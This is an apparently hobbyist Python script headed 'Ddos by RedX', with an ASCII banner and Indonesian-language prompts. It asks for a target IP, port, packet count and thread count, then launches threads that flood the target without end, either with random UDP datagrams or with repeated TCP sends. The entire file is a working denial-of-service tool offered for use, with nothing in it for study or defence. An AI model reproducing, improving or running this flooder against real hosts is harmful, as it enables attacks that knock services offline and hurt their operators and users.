#!/usr/bin/env python3
#Ddos by RedX
import random
import socket
import threading
import os

os.system("clear")
print("\033[93m")

print('''\033[94m Tools By RedX
██████╗░███████╗██████ ╗██╗░░██╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
██████╔╝█████╗░░██║░░██║░╚███╔╝
██╔══██╗██╔══╝░░██║░░██║░██╔██╗
██║░░██║███████╗██████╔╝██╔╝╚██╗
╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝

------------------------------------------------------------
      >Jangan Abuse Ya Maniez<         
          >Tools By RedX<              
-----------------------------------------------------------
''')
ip = str(input("MASUKIN IPNYA WOE | ip:"))
port = int(input("MASUKIN PORTNYA WOE | port:"))
choice = str(input("Serang Ga Ni WOY?(y/n):"))
times = int(input("Packetnya berapa | Packets:"))
threads = int(input("Mau Berapa Lama | Threads:"))
def run():
        data = random._urandom(1024)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG ")
                except:
                        print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
def run2():
        data = random._urandom(860)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                             s.send(data)
                        print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
                except:
                        s.close()
                        print("\033[93m[*TOK*TOK*] PERMISI PAKET DATENG")
for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
        else:
                 th = threading.Thread(target = run2)
                 th.start()
